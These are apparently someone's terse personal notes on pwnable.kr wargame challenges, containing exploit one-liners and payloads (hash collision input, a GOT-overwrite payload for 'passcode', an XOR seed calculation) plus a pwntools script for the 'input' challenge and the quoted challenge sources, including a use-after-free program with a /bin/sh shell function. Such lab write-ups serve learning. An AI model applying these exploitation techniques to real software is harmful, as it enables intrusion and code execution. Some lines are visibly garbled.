1. fd
- use stdin

---

2. col 
- 0x21DD09EC / 5

PL ./col `python -c 'print "\xc8\xce\xc5\x06"*4  +"\xcc\xce\xc5\x06"'`

Entry point address:               0x44a4f0q

3.BOF


338150 => 528E6
13371337 => CC 07C9

system(/bin/cat flag) => 0x080485e3	"\xe3\x85\x04\x08" = 134514147
 0x080485e3
fflush : 0x8048430 => "\x30\x84\x04\x08"
passcode1 = 6*4 = stack end - 24 100 `76`

(python -c 'print "A" *96 +"\x30\x84\x04\x08" + "134514147"') | ./passcode

0x528e6  => \xe6\x28\x05\x00
0xCC07C9 => \xc9\x07\xcc\x00

---

4. (upx -d flag; gdb flag, follow flag)

---

5. key ^ rand() = 0xdeadbeef = 1101 1110 1010 1101 1011 1110 1110 1111
when key = 0    key ^ rand() = 0110 1011 1000 1011 0100 0101 0110 0111
                             = 1011 0101 0010 0110 1111 1011 1000 1000 = B526 FB88 (3039230856)

---

6. random
-> Not so random with constant seed

---

7. input
PL : mkdir /tmp/qpalzmm22; cd /tmp/qpalzmm22
PL : vi exploit.py

```python
from pwn import *


# Stage 1
s1 = []
s1 = [str(i) for i in range (100)]
s1[ord('A')] = "\x00"
s1[ord('B')] = "\x20\x0a\x0d"
s1[ord('C')] = "48000"

# Stage 2

with open('./stderr', 'a') as f:
        f.write('\x00\x0a\x02\xff')

# Stage 3

envdic = {"\xde\xad\xbe\xef" : "\xca\xfe\xba\xbe"}

# Stage 4

with open('./\x0a','w') as f:
        f.write('\x00\x00\x00\x00')

# Stage 5


sh = process(executable = "/home/input2/input", argv=s1, stderr=open('./stderr'), env=envdic )

sh.send("\x00\x0a\x00\xff")

client_con = remote('localhost', 48000)
client_con.send("\xde\xad\xbe\xef")

sh.interactive()
```
PL : ln -s ~/flag flag; python exploit.py
    ANS : Mommy! I learned how to pass various input in Linux :)


```c    
int main(int argc, char* argv[], char* envp[]){
    printf("Welcome to pwnable.kr\n");
    printf("Let's see if you know how to give input to program\n");
    printf("Just give me correct inputs then you will get the flag :)\n");

    // argv
    if(argc != 100) return 0;                         // 6   
    if(strcmp(argv['A'],"\x00")) return 0;            // 65 : 0
    if(strcmp(argv['B'],"\x20\x0a\x0d")) return 0;    // 66 : 0xd0a20
    printf("Stage 1 clear!\n");
        // `python -c 'print "A"*64+"\x00"+"\x20\x0a\x0d"+"\x00"'`

    // stdio
    char buf[4];
    read(0, buf, 4);                                
    if(memcmp(buf, "\x00\x0a\x00\xff", 4)) return 0;
    read(2, buf, 4);
    if(memcmp(buf, "\x00\x0a\x02\xff", 4)) return 0;
    printf("Stage 2 clear!\n");

    // env
    if(strcmp("\xca\xfe\xba\xbe", getenv("\xde\xad\xbe\xef"))) return 0;
    printf("Stage 3 clear!\n");

    // file
    FILE* fp = fopen("\x0a", "r");
    if(!fp) return 0;
    if( fread(buf, 4, 1, fp)!=1 ) return 0;
    if( memcmp(buf, "\x00\x00\x00\x00", 4) ) return 0;
    fclose(fp);\
    printf("Stage 4 clear!\n");

    // network
    int sd, cd;
    struct sockaddr_in saddr, caddr;
    sd = socket(AF_INET, SOCK_STREAM, 0);
    if(sd == -1){
            printf("socket error, tell admin\n");
            return 0;
    }
    saddr.sin_family = AF_INET;
    saddr.sin_addr.s_addr = INADDR_ANY;
    saddr.sin_port = htons( atoi(argv['C']) );
    if(bind(sd, (struct sockaddr*)&saddr, sizeof(saddr)) < 0){
            printf("bind error, use another port\n");
            return 1;
    }
    listen(sd, 1);
    int c = sizeof(struct sockaddr_in);
    cd = accept(sd, (struct sockaddr *)&caddr, (socklen_t*)&c);

    if(cd < 0){
            printf("accept error, tell admin\n");
            return 0;
    }
    if( recv(cd, buf, 4, 0) != 4 ) return 0;
    if(memcmp(buf, "\xde\xad\xbe\xef", 4)) return 0;
    printf("Stage 5 clear!\n");

    // here's your flag
    system("/bin/cat flag");
    return 0;
}
```

---

16.

gdb) info functions
0x000000000040117a  Human::give_shell()
3
3
3
```cpp
#include <fcntl.h>
#include <iostream>
#include <cstring>
#include <cstdlib>
#include <unistd.h>
using namespace std;

class Human{
private:
        virtual void give_shell(){
                system("/bin/sh");
        }
protected:
        int age;
        string name;
public:
        virtual void  (){
                cout << "My name is " << name << endl;
                cout << "I am " << age << " years old" << endl;
        }
};

class Man: public Human{
public:
        Man(string name, int age){
                this->name = name;
                this->age = age;
        }
        virtual void introduce(){
                Human::introduce();
                cout << "I am a nice guy!" << endl;
        }
};

class Woman: public Human{
public:
        Woman(string name, int age){
                this->name = name;
                this->age = age;
        }
        virtual void introduce(){
                Human::introduce();
                cout << "I am a cute girl!" << endl;
        }
};

int main(int argc, char* argv[]){
        Human* m = new Man("Jack", 25);
        Human* w = new Woman("Jill", 21);

        size_t len;
        char* data;
        unsigned int op;
        while(1){
                cout << "1. use\n2. after\n3. free\n";
                cin >> op;

                switch(op){
                        case 1:
                                m->introduce();
                                w->introduce();
                                break;
                        case 2:
                                len = atoi(argv[1]);
                                data = new char[len];
                                read(open(argv[2], O_RDONLY), data, len);
                                cout << "your data is allocated" << endl;
                                break;
                        case 3:
                                delete m;
                                delete w;
                                break;
                        default:
                                break;
                }
        }

        return 0;
}
```




bluekat

ghidra 설치